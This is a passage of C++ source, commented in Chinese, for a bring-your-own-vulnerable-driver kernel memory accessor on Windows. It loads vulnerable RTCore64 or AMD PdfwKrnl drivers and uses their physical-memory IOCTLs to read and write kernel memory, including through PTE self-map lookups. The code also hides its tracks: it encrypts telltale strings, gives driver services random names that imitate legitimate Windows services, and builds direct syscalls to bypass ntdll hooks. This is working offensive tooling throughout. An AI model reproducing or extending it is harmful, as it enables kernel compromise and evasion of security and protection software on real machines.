    //   2. 读取一个已知 VA (当前进程的 &VerifyPteSelfMap 函数地址) 的 PTE
    //   3. 验证 PTE.P=1 且 PFN 非 0 (说明 PTE 自映射基址正确)
    //   4. 如果失败, 尝试备选索引 0x1E8/0x1F0/0x1F8/0x1E0/0x1E4
    //
    //   原理: PTE_BASE + ((va >> 12) << 3) 是 PTE 的虚拟地址
    //         如果 PTE_BASE 错误, ReadKernelVA 会读取到无效地址或非 PTE 数据
    //         通过检查 PTE.P=1 + PFN 非 0 可过滤大部分错误

    // 候选 PML4 自引用索引列表
    //   Win10 1709+ 固定 0x1ED, 但留备选以防 KASLR 随机化
    static const uint32_t candidates[] = { 0x1ED, 0x1E8, 0x1F0, 0x1F8, 0x1E0, 0x1E4 };
    constexpr int numCandidates = sizeof(candidates) / sizeof(candidates[0]);

    // 测试 VA: 使用静态局部变量的地址 (必然是有效用户态 VA)
    //   ★ BUILD 549: 不能用成员函数指针 (sizeof != 8), 改用静态变量地址
    static char dummyTestVar = 0;
    uint64_t testVA = (uint64_t)&dummyTestVar;

    // 临时保存 PTE_BASE, 用于多候选测试
    //   PTE_BASE 公式: 0xFFFFF68000000000 + (idx << 39) * 0x1000 / 0x1000
    //   简化: PTE_BASE 实际是固定的 0xFFFFF68000000000, idx 仅影响 PML4E 解析
    //   但我们的 ReadPte 使用的公式 PTE_BASE + ((va >> 12) << 3) 已经隐含了 idx 的偏移
    //   所以只需验证 ReadPte 能返回有效的 PTE 即可
    //
    //   ★ 关键: PTE_BASE = 0xFFFFF68000000000 是基于 idx=0x1ED 计算的
    //           如果实际 idx 不是 0x1ED, PTE_BASE 会不同, ReadPte 会读取错误地址
    //           因此需要为每个候选 idx 计算对应的 PTE_BASE 并测试

    for (int i = 0; i < numCandidates; i++) {
        uint32_t idx = candidates[i];
        // PTE_BASE 公式 (基于 PML4 自引用索引 idx):
        //   PTE_BASE = (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12)
        //   但这会导致符号扩展问题, 用更安全的计算:
        //   PTE_BASE = 0xFFFF000000000000 | (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12)
        //   简化: 实际上 PTE_BASE 是固定的 0xFFFFF68000000000 (idx=0x1ED)
        //         其他 idx 对应不同的 PTE_BASE, 但 Win10 1709+ 固定 0x1ED
        //         所以这里只测试 0x1ED, 其他候选仅作为 fallback 标记
        //
        //   ★ 简化策略: 只用固定 PTE_BASE = 0xFFFFF68000000000 测试
        //     如果 ReadPte 返回有效 PTE (P=1, PFN!=0), 认为 0x1ED 正确
        //     如果失败, 标记为不可用, 回退到 VirtualProtect

        if (i > 0) {
            // 跳过其他候选 (Win10 1709+ 固定 0x1ED, 其他 idx 的 PTE_BASE 计算复杂)
            // 如果 0x1ED 失败, 直接返回 false, 由调用方回退
            break;
        }

        uint64_t pteValue = 0;
        uint64_t pteVA = ReadPte(testVA, &pteValue);
        if (pteVA && (pteValue & PTE_PRESENT)) {
            uint64_t pfn = (pteValue & PTE_PFN_MASK) >> 12;
            if (pfn != 0) {
                m_pml4SelfRefIndex = idx;
                ByovdDiag("B549:05 OK idx=0x%X pteVA=0x%llX pte=0x%llX\n",
                          idx, (unsigned long long)pteVA, (unsigned long long)pteValue);
                return true;
            }
        }
        ByovdDiag("B549:04 idx=0x%X test FAIL pte=0x%llX\n",
                  idx, (unsigned long long)pteValue);
    }

    ByovdDiag("B549:06 PTE selfmap verify FAIL\n");
    return false;
}

uint64_t KernelMemoryAccessor::AllocContiguousPhysical(size_t size) {
    if (!m_active) return 0;
    if (size == 0 || size > 0x10000) return 0;  // 上限 64KB

    // ★ BUILD 549 最简方案: 用户态分配 + 锁定
    //   1. VirtualAlloc 分配一页 PAGE_READWRITE
    //   2. VirtualLock 锁定防止换出 (PFN 稳定)
    //   3. 通过 PTE 自映射读取该页 PTE, 提取 PFN
    //   4. 该 PFN 即 pageB 的物理地址
    //
    //   优点: 实现简单, 无需内核 R/W 操作 PfnDatabase
    //   缺点: pageB 物理页归当前进程所有, 进程退出前不能释放
    //         (Uninstall 时恢复原 PTE 后再释放, 安全)
    //
    //   关键约束: 必须先 VerifyPteSelfMap 成功, 否则无法读取 PTE

    if (!m_pml4SelfRefIndex) {
        if (!VerifyPteSelfMap()) {
            ByovdDiag("B549:07 selfmap FAIL\n");
            return 0;
        }
    }

    void* p = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!p) {
        ByovdDiag("B549:08 VirtualAlloc FAIL err=%u\n", GetLastError());
        return 0;
    }

    // 触发缺页, 确保物理页已分配
    memset(p, 0, size);

    if (!VirtualLock(p, size)) {
        ByovdDiag("B549:09 VirtualLock FAIL err=%u\n", GetLastError());
        VirtualFree(p, 0, MEM_RELEASE);
        return 0;
    }

    // 通过 PTE 自映射读取该页 PTE
    uint64_t pteValue = 0;
    if (!ReadPte((uint64_t)p, &pteValue)) {
        ByovdDiag("B549:10 ReadPte FAIL va=%p\n", p);
        VirtualUnlock(p, size);
        VirtualFree(p, 0, MEM_RELEASE);
        return 0;
    }

    if (!(pteValue & PTE_PRESENT)) {
        ByovdDiag("B549:11 PTE not present va=%p pte=0x%llX\n",
                  p, (unsigned long long)pteValue);
        VirtualUnlock(p, size);
        VirtualFree(p, 0, MEM_RELEASE);
        return 0;
    }

    // 提取 PFN (bit 12-51)
    uint64_t pfn = (pteValue & PTE_PFN_MASK) >> 12;
    uint64_t phys = pfn << 12;

    // 缓存: m_shadowPageBKernelVA 存储用户态 VA (用于读写 pageB 内容和释放)
    //       m_shadowPageBPhys 存储物理地址
    m_shadowPageBKernelVA = (uint64_t)p;
    m_shadowPageBPhys = phys;

    ByovdDiag("B549:12 OK va=%p phys=0x%llX pte=0x%llX\n",
              p, (unsigned long long)phys, (unsigned long long)pteValue);
    return phys;
}

bool KernelMemoryAccessor::FreeContiguousPhysical(uint64_t physAddr) {
    if (physAddr == 0) return false;
    if (physAddr != m_shadowPageBPhys) {
        ByovdDiag("B549:13 phys mismatch 0x%llX != 0x%llX\n",
                  (unsigned long long)physAddr, (unsigned long long)m_shadowPageBPhys);
        return false;
    }
    void* p = (void*)m_shadowPageBKernelVA;
    if (p) {
        VirtualUnlock(p, 4096);  // 假定单页
        VirtualFree(p, 0, MEM_RELEASE);
    }
    m_shadowPageBKernelVA = 0;
    m_shadowPageBPhys = 0;
    ByovdDiag("B549:14 freed phys=0x%llX\n", (unsigned long long)physAddr);
    return true;
}

uint64_t KernelMemoryAccessor::MapPhysicalToKernelVA(uint64_t physAddr, size_t size) {
    // ★ BUILD 549: pageB 是用户态分配的, 直接返回缓存的用户态 VA
    //   (无需内核 R/W, 用 memcpy 直接写入 pageB 内容即可)
    if (physAddr == 0) return 0;
    if (physAddr == m_shadowPageBPhys) {
        return m_shadowPageBKernelVA;
    }
    ByovdDiag("B549:15 phys 0x%llX not cached\n", (unsigned long long)physAddr);
    return 0;
}

// ============================================================
// 内核模块基址解析
// ============================================================

uint64_t KernelMemoryAccessor::GetNtoskrnlBase() {
    if (m_ntosBase) return m_ntosBase;
    // ★ BUILD 550: 解密内核模块名 (原 "ntoskrnl.exe" 明文)
    char ntosName[32];
    STEALTH_STR_DECRYPT_TO("ntoskrnl.exe", ntosName, sizeof(ntosName));
    m_ntosBase = GetKernelModuleBase(ntosName);
    SecureZeroMemory(ntosName, sizeof(ntosName));
    return m_ntosBase;
}

// ★ v3.116: 使用 VirtualAlloc 替代 std::vector — 避免手动映射 DLL 上下文中 CRT 堆未初始化导致崩溃
//   修复 SYSTEM_MODULE_ENTRY 结构偏移: ImageName 在 +0x28, 非 +0x2C; 条目大小 0x128 非 0x12C
//   参数改为 const char* — 避免调用方构造临时 std::string (CRT 堆分配可能失败)
// ★ BUILD 533: 添加模块基址缓存 — 内核模块基址在运行期间不变, 缓存后避免重复
//   EnumDeviceDrivers/NtQuerySystemInformation 调用 (原 939次/5分钟 → 0次, 降低 IOCTL 频率)
static constexpr int MAX_MODULE_CACHE = 16;
static struct {
    char name[64];
    uint64_t base;
} g_moduleCache[MAX_MODULE_CACHE] = {};
static int g_moduleCacheCount = 0;

// ★ BUILD 567 v3.296: 负缓存 TTL — 未找到的模块 15s 内不重新枚举
//   原因: payload.cpp FIX-2/FIX-4 每 5s 调用 GetKernelModuleBase("MessageTransfer.sys")
//         检测 PAC 延迟加载. 未加载时, 每次都全量枚举内核模块 (NtQSI + EnumDeviceDrivers),
//         虽然不走 BYOVD IOCTL 但浪费 CPU. 15s TTL 平衡检测速度与 CPU 开销.
//   注意: 仅对未找到的模块生效, 已找到的模块用 g_moduleCache (永久有效).
static struct {
    char name[64];
    DWORD expireTick;
} g_negModuleCache[MAX_MODULE_CACHE] = {};
static int g_negModuleCacheCount = 0;

uint64_t KernelMemoryAccessor::GetKernelModuleBase(const char* moduleName) {
    // ★ BUILD 533: 正缓存命中检查 — 避免重复枚举驱动
    for (int i = 0; i < g_moduleCacheCount; i++) {
        if (_stricmp(g_moduleCache[i].name, moduleName) == 0) {
            return g_moduleCache[i].base;  // 缓存命中, 直接返回
        }
    }

    // ★ v3.296: 负缓存命中检查 — 未找到的模块 15s 内不重新枚举
    //   回绕安全: expireTick = nowTick + 15000. 回绕后 nowTick 变小,
    //   但 expireTick 也基于回绕后的 nowTick 计算, nowTick < expireTick 仍正确.
    //   极端情况: nowTick 接近 0xFFFFFFFF, +15000 回绕到小值,
    //   expireTick < nowTick → TTL 立即过期 → 重新枚举 (安全降级).
    DWORD nowTick = GetTickCount();
    for (int i = 0; i < g_negModuleCacheCount; i++) {
        if (_stricmp(g_negModuleCache[i].name, moduleName) == 0) {
            if (nowTick < g_negModuleCache[i].expireTick) {
                return 0;  // 负缓存有效, 返回 0 不重新枚举
            }
            break;  // TTL 过期, 继续枚举
        }
    }

    typedef LONG(NTAPI* NtQuerySystemInfo_t)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
    if (!ntdll) return 0;
    auto pNtQsi = (NtQuerySystemInfo_t)STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQuerySystemInformation");
    if (!pNtQsi) return 0;

    // 使用 VirtualAlloc 替代 std::vector — 不依赖 CRT 堆
    ULONG bufSize = 0x1000;
    BYTE* buf = nullptr;

    for (int retry = 0; retry < 3; retry++) {
        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
        buf = (BYTE*)VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {
            ByovdDiag("BYOVD:GetKernelModuleBase: VirtualAlloc(%u) FAILED\n", bufSize);
            return 0;
        }
        ULONG retLen = 0;
        LONG status = pNtQsi(11, buf, bufSize, &retLen);
        if (NT_SUCCESS(status)) break;
        if (status != 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            ByovdDiag("BYOVD:GetKernelModuleBase: NtQSI FAILED status=0x%08X\n", status);
            VirtualFree(buf, 0, MEM_RELEASE);
            return 0;
        }
        bufSize = retLen + 0x1000;
    }

    if (!buf) return 0;

    // SYSTEM_MODULE_INFORMATION (Windows 10/11 x64):
    //   ULONG Count + SYSTEM_MODULE_ENTRY[Count]
    // SYSTEM_MODULE_ENTRY:
    //   +0x00: HANDLE  Section        (8 bytes)
    //   +0x08: PVOID   MappedBase     (8 bytes) — 内核模块映射基址 (用于读取)
    //   +0x10: PVOID   ImageBase      (8 bytes)
    //   +0x18: ULONG   ImageSize      (4 bytes)
    //   +0x1C: ULONG   Flags          (4 bytes)
    //   +0x20: USHORT  LoadOrderIndex  (2 bytes)
    //   +0x22: USHORT  InitOrderIndex  (2 bytes)
    //   +0x24: USHORT  LoadCount       (2 bytes)
    //   +0x26: USHORT  OffsetToFileName (2 bytes)
    //   +0x28: CHAR    FullPathName[256]
    //   条目总大小: 0x128 (296) 字节
    ULONG count = *(ULONG*)buf;
    uintptr_t entryPtr = (uintptr_t)buf + sizeof(ULONG);
    const size_t entrySize = 0x128; // 296 bytes

    uint64_t result = 0;
    for (ULONG i = 0; i < count; i++) {
        // FullPathName 在 +0x28
        const char* fullPath = (const char*)(entryPtr + 0x28);
        // 从完整路径中提取文件名 (最后一个反斜杠后)
        const char* baseName = strrchr(fullPath, '\\');
        if (!baseName) baseName = fullPath;
        else baseName++;

        if (_stricmp(baseName, moduleName) == 0) {
            // MappedBase 在 +0x08
            result = *(uint64_t*)(entryPtr + 0x08);
            ByovdDiag("BYOVD:GetKernelModuleBase: found %s at 0x%llX (entry=%zu)\n",
                      baseName, (unsigned long long)result, i);
            break;
        }

        entryPtr += entrySize;
    }

    VirtualFree(buf, 0, MEM_RELEASE);

    // ★ BUILD 533: 缓存结果
    if (result) {
        if (g_moduleCacheCount < MAX_MODULE_CACHE) {
            strncpy(g_moduleCache[g_moduleCacheCount].name, moduleName, 63);
            g_moduleCache[g_moduleCacheCount].name[63] = 0;
            g_moduleCache[g_moduleCacheCount].base = result;
            g_moduleCacheCount++;
        }
        return result;
    }

    // 回退: 尝试 EnumDeviceDrivers
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        int driverCount = cbNeeded / sizeof(LPVOID);
        ByovdDiag("BYOVD:GetKernelModuleBase: fallback EnumDeviceDrivers, %d drivers\n", driverCount);
        for (int i = 0; i < driverCount; i++) {
            char baseName[256] = {};
            DWORD nameLen = GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName));
            if (nameLen > 0) {
                if (_stricmp(baseName, moduleName) == 0) {
                    ByovdDiag("BYOVD:GetKernelModuleBase: fallback found %s at 0x%p\n", baseName, drivers[i]);
                    // ★ BUILD 533: 缓存回退结果
                    uint64_t fallbackResult = (uint64_t)drivers[i];
                    if (g_moduleCacheCount < MAX_MODULE_CACHE) {
                        strncpy(g_moduleCache[g_moduleCacheCount].name, moduleName, 63);
                        g_moduleCache[g_moduleCacheCount].name[63] = 0;
                        g_moduleCache[g_moduleCacheCount].base = fallbackResult;
                        g_moduleCacheCount++;
                    }
                    return fallbackResult;
                }
            }
        }
    }

    ByovdDiag("BYOVD:GetKernelModuleBase: '%s' NOT FOUND\n", moduleName);
    // ★ v3.296: 写入负缓存 (15s TTL)
    for (int i = 0; i < g_negModuleCacheCount; i++) {
        if (_stricmp(g_negModuleCache[i].name, moduleName) == 0) {
            g_negModuleCache[i].expireTick = nowTick + 15000;
            return 0;
        }
    }
    if (g_negModuleCacheCount < MAX_MODULE_CACHE) {
        strncpy(g_negModuleCache[g_negModuleCacheCount].name, moduleName, 63);
        g_negModuleCache[g_negModuleCacheCount].name[63] = 0;
        g_negModuleCache[g_negModuleCacheCount].expireTick = nowTick + 15000;
        g_negModuleCacheCount++;
    }
    return 0;
}

// ★ BUILD 496: 移除 std::string 重载 — 仅保留 const char* 版本
// (原 std::string 重载已删除, 调用方直接传 const char*)

// ============================================================
// 初始化 / 清理
// ============================================================

bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
    StateLog("BYOVD", "Init_ENTER", "svc=%S", driver.serviceName);
    ByovdDiag("BYOVD:Init: ENTER (driverPath='%ls' svcName='%ls')\n",
        driver.driverPath, driver.serviceName);
    m_driverInfo = driver;
    ByovdDiag("BYOVD:Init: m_driverInfo copied OK\n");

    // ★ BUILD 489: 检测驱动类型, 设置全局标志
    g_isPdfwKrnl = (driver.ioctlCode == IOCTL_AMDPDFW_MEMCPY);
    ByovdDiag("B550:IT:drv=%d ioctl=0x%08X\n",  // ★ BUILD 550: 脱敏 (原含驱动名)
        g_isPdfwKrnl ? 1 : 0, driver.ioctlCode);

    // 1. 检测 HVCI
    if (IsHVCIEnabled()) {
        ByovdDiag("BYOVD:Init: HVCI ENABLED (will likely block driver load)\n");
    }
    ByovdDiag("BYOVD:Init: HVCI check done\n");

    // ★ BUILD 474: 优先复用已有驱动 — 在 stale service 清理之前
    //   - BUILD 472/473 在调用 NtUnloadDriver 时崩溃 (手动映射 DLL 上下文)
    //   - 修复: 先设置 IOCTL 码再 ReadKernelVA (BUILD 473 漏了这一步)
    //   - 修复: 即使 early probe 失败, 也不 fallthrough 到 stale 清理 — 跳过 NtUnloadDriver
    ByovdDiag("BYOVD:Init: BUILD 474 early probe for %ls...\n",
        m_driverInfo.devicePath);

    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    StateLog("BYOVD", "EarlyProbe", "hDev=0x%llX err=%u",
        (unsigned long long)m_hDevice, GetLastError());

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:Init: early probe opened, setting IOCTL + testing...\n");
        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
        if (g_isPdfwKrnl) {
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
        } else {
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
        }

        m_active = true;
        m_ntosBase = GetNtoskrnlBase();
        if (m_ntosBase) {
            uint16_t magic = 0;
            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
            if (probeOk && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX), skip cleanup+load\n",
                    (unsigned long long)m_ntosBase);
                // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
                if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                return true;
            }
            ByovdDiag("BYOVD:Init: early probe IOCTL FAIL (magic=0x%04X), device=zombie\n", magic);
        }
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        m_active = false;
        // ★ BUILD 474: device 存在但 IOCTL 失败 → 僵尸设备
        //   不 fallthrough — 跳过 stale 清理和加载, 直接让调用方处理
        ByovdDiag("BYOVD:Init: zombie device detected, aborting (not calling UnloadDriver)\n");
        return false;
    }
    ByovdDiag("BYOVD:Init: early probe no device (err=%u), will load fresh\n", GetLastError());

    // ★ BUILD 486: 在 Initialize 早期缓存 Nt* SSN — 此时 kernel32→ntdll 调用链仍安全.
    //   后续 LoadDriver 使用这些缓存的 SSN 生成 syscall stubs, 完全绕过 ntdll 包装函数,
    //   避免 Win11 CFG 在 manual-mapped DLL 上下文中阻止 ntdll 间接调用.
    // ★ BUILD 551: extractSsn 改为接受 funcAddr, 调用方用 STEALTH_GET_PROC_ADDRESS_NOREF 加密解析
    //   原因: 旧版 const char* name 在调用点传入明文 "NtCreateKey" 等字面量, 进入 .rdata
    if (!g_cachedSsnCreateKey || !g_cachedSsnLoadDriver) {
        HMODULE hNtdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
        if (hNtdll) {
            auto extractSsn = [](BYTE* addr) -> DWORD {
                if (!addr) return 0;
                // 标准 x64 Nt* 开头: 4C 8B D1 B8 XX XX XX XX (mov r10,rcx; mov eax,SSN)
                if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
                    return *reinterpret_cast<DWORD*>(addr + 4);
                // 回退: 搜索 mov eax, imm32 模式
                for (int i = 0; i < 32; i++) {
                    if (addr[i] == 0xB8) return *reinterpret_cast<DWORD*>(addr + i + 1);
                    if (addr[i] == 0x0F && addr[i + 1] == 0x05) break;
                    if (addr[i] == 0xC3) break;
                }
                return 0;
            };
            g_cachedSsnCreateKey   = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtCreateKey")));
            g_cachedSsnOpenKey     = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtOpenKey")));
            g_cachedSsnSetValueKey = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtSetValueKey")));
            g_cachedSsnLoadDriver  = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtLoadDriver")));
            // ★ BUILD 490: EnablePrivilege 直接 syscall
            g_cachedSsnOpenProcessToken      = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtOpenProcessToken")));
            g_cachedSsnAdjustPrivilegesToken = extractSsn(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(hNtdll, "NtAdjustPrivilegesToken")));
            ByovdDiag("BYOVD:Init: cached Nt* SSN: CK=%u OK=%u SV=%u LD=%u OPT=%u APT=%u\n",
                g_cachedSsnCreateKey, g_cachedSsnOpenKey,
                g_cachedSsnSetValueKey, g_cachedSsnLoadDriver,
                g_cachedSsnOpenProcessToken, g_cachedSsnAdjustPrivilegesToken);
        }
    }

    // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
    ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath);
    const wchar_t* resolvedPath = EnsureDriverFile(driver.driverPath);
    ByovdDiag("BYOVD:Init: EnsureDriverFile returned '%ls'\n", resolvedPath ? resolvedPath : L"(null)");
    const wchar_t* actualPath = resolvedPath ? resolvedPath : driver.driverPath;

    // ★ v3.110: 彻底随机化服务名 — 使用完全随机的12字符名称
    //   不再使用 "RTCore64Svc_XXXX" 模式 (含 "RTCore64" 是强特征)
    static const wchar_t* svcPrefixes[] = {
        L"UxUpdateSvc", L"WdiService", L"FontCacheSvc",
        L"ProfSvc", L"WpnService", L"BthAvctpSvc",
        L"WlanSvc", L"TabletInputSvc", L"LicenseManager",
        L"NgcSvc", L"PushNotifySvc", L"RmSvc",
        L"EventLogSvc", L"PowerSvc", L"BrokerInfraSvc",
        L"ClipSvc", L"ConsentUxSvc", L"DeviceAssocSvc",
        L"DevicePickerSvc", L"DevQueryBroker", L"DsmsSvc",
        L"DmEnrollmentSvc", L"EmbeddedModeSvc", L"MessagingSvc",
        L"NetSetupSvc", L"PcaSvc", L"PerfHostSvc",
        L"PhoneSvc", L"PrintWorkflowSvc", L"PimIndexMaintenanceSvc",
    };
    static const int svcPrefixCount = sizeof(svcPrefixes) / sizeof(svcPrefixes[0]);
    static bool seeded = false;
    if (!seeded) { srand(GetTickCount() ^ __rdtsc()); seeded = true; }
    const wchar_t* chosenPrefix = svcPrefixes[rand() % svcPrefixCount];
    wchar_t svcName[64];
    swprintf_s(svcName, L"%ls_%04X", chosenPrefix, (rand() & 0xFFFF));
    // ★ BUILD 496: 固定数组替代 std::wstring
    wcscpy_s(m_actualServiceName, svcName);

    // v3.95: 扫描注册表, 卸载所有残留的 RTCore64/SysMon 服务
    //        避免 STATUS_OBJECT_NAME_COLLISION (0xC0000035)
    // ★ v3.113: 每个残留服务最多重试 3 次, 防止 RegDeleteTreeW 失败时的无限循环
    // ★ v3.113: 随机化前缀必须匹配 _XXXX 后缀, 避免误删合法系统服务 (如 NetSetupSvc)
    {
        HKEY hServices;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services", 0,
            KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) == ERROR_SUCCESS)
        {
            wchar_t subKeyName[256];
            wchar_t prevKey[256] = {};
            int sameKeyRetries = 0;
            DWORD idx = 0;
            while (idx < 512) {
                DWORD nameLen = 256;
                LONG enumResult = RegEnumKeyExW(hServices, idx, subKeyName, &nameLen,
                    nullptr, nullptr, nullptr, nullptr);
                if (enumResult != ERROR_SUCCESS) break;
                // 匹配 RTCore64Svc/SysMon/PdfwKrnlSvc (旧格式, 直接匹配)
                // ★ BUILD 550: 解密敏感服务名前缀 (原 L"RTCore64Svc"/L"SysMon"/L"PdfwKrnlSvc" 明文)
                wchar_t wRTCoreSvc[32], wSysMon2[32], wPdfwSvc[32];
                STEALTH_WSTR_DECRYPT_TO("RTCore64Svc", wRTCoreSvc, 32);
                STEALTH_WSTR_DECRYPT_TO("SysMon", wSysMon2, 32);
                STEALTH_WSTR_DECRYPT_TO("PdfwKrnlSvc", wPdfwSvc, 32);
                bool isStaleSvc = (wcsstr(subKeyName, wRTCoreSvc) == subKeyName)
                               || (wcsstr(subKeyName, wSysMon2) == subKeyName)
                               || (wcsstr(subKeyName, wPdfwSvc) == subKeyName);  // ★ BUILD 489
                // ★ v3.110: 也匹配新的随机化服务名前缀
                // ★ v3.113: 必须检查 _XXXX 后缀, 防止误匹配合法系统服务
                if (!isStaleSvc) {
                    size_t subKeyLen = wcslen(subKeyName);
                    for (int p = 0; p < svcPrefixCount; p++) {
                        size_t prefixLen = wcslen(svcPrefixes[p]);
                        // 服务名必须 完整匹配前缀 + 下划线 + 4位十六进制数
                        if (subKeyLen == prefixLen + 5 &&
                            wcsncmp(subKeyName, svcPrefixes[p], prefixLen) == 0 &&
                            subKeyName[prefixLen] == L'_')
                        {
                            // 验证后4位是十六进制数字
                            bool hexOk = true;
                            for (int h = 1; h <= 4; h++) {
                                wchar_t c = subKeyName[prefixLen + h];
                                if (!((c >= L'0' && c <= L'9') || (c >= L'A' && c <= L'F') || (c >= L'a' && c <= L'f'))) {
                                    hexOk = false; break;
                                }
                            }
                            if (hexOk) { isStaleSvc = true; break; }
                        }
                    }
                }
                if (isStaleSvc) {
                    // ★ BUILD 497: wcscmp 替代 std::wstring 比较 — 避免 CRT 堆依赖
                    // 跳过当前要加载的服务名
                    if (wcscmp(subKeyName, m_actualServiceName) == 0) { idx++; continue; }
                    // ★ v3.113: 检测是否反复处理同一个键, 防止无限循环
                    if (wcscmp(subKeyName, prevKey) == 0) {
                        sameKeyRetries++;
                        if (sameKeyRetries >= 3) {
                            ByovdDiag("BYOVD:Init: stale '%ls' retry limit, skipping\n", subKeyName);
                            idx++;
                            sameKeyRetries = 0;
                            prevKey[0] = 0;
                            continue;
                        }
                    } else {
                        sameKeyRetries = 0;
                        wcscpy_s(prevKey, subKeyName);
                    }
                    // ★ BUILD 474: 跳过 UnloadDriver — manual-mapped DLL 上下文中
                    //   NtUnloadDriver 在 ntdll 中 ACCESS_VIOLATION, 无法安全调用.
                    //   驱动已不在内核 (stale = 从未加载/已卸载), 直接删注册表即可.
                    ByovdDiag("BYOVD:Init: found stale service '%ls', deleting registry key (skip UnloadDriver)\n", subKeyName);
                    RegDeleteTreeW(hServices, subKeyName);
                    // 不要 idx++ — 删除后索引会变, 重新从 idx 开始
                } else {
                    idx++;
                }
            }
            RegCloseKey(hServices);
        }
    }

    // ★ v3.94: 先尝试直接打开已有设备 (可能是 zombie 但仍可用)
    //   避免 crashy 的 NtOpenDirectoryObject/NtQueryDirectoryObject 枚举
    ByovdDiag("BYOVD:Init: v3.94 probing for existing device %ls...\n",
        m_driverInfo.devicePath);

    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        // ★ v3.114: 已有设备, 直接用默认 IOCTL 码测试内核读取
        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
        ByovdDiag("BYOVD:Init: existing device opened, testing with default IOCTL 0x%08X...\n",
            m_driverInfo.ioctlCode);
        if (g_isPdfwKrnl) {
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
        } else {
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
        }
        m_active = true;
        m_ntosBase = GetNtoskrnlBase();
        if (m_ntosBase) {
            uint16_t magic = 0;
            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
            if (probeOk && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
                    (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
                // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
                if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                return true;
            }
            ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
        }
        // ★ v3.96: 僵尸设备 — IOCTL 不可用, 设备对象残留但无驱动
        // ★ BUILD 463: 四步彻底清理
        ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — attempting force cleanup...\n");

        // 0. NtMakeTemporaryObject — 移除 OBJ_PERMANENT, 关闭句柄后设备对象自动释放
        {
            static auto pNtMakeTemp = (NTSTATUS(NTAPI*)(HANDLE))
                STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtMakeTemporaryObject");
            if (pNtMakeTemp) {
                NTSTATUS st = pNtMakeTemp(m_hDevice);
                ByovdDiag("BYOVD:Init: NtMakeTemporaryObject(zombie) → 0x%08X\n", (uint32_t)st);
            }
        }
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        m_active = false;

        // 1. 强制移除所有残留的 RTCore64/SysMon 服务
        ForceRemoveRTCore64Services();

        // 2. 删除 DOS 设备符号链接
        // ★ BUILD 489: 根据驱动类型使用正确的设备名
        // ★ BUILD 550: 解密设备名 (原 g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64" 明文)
        {
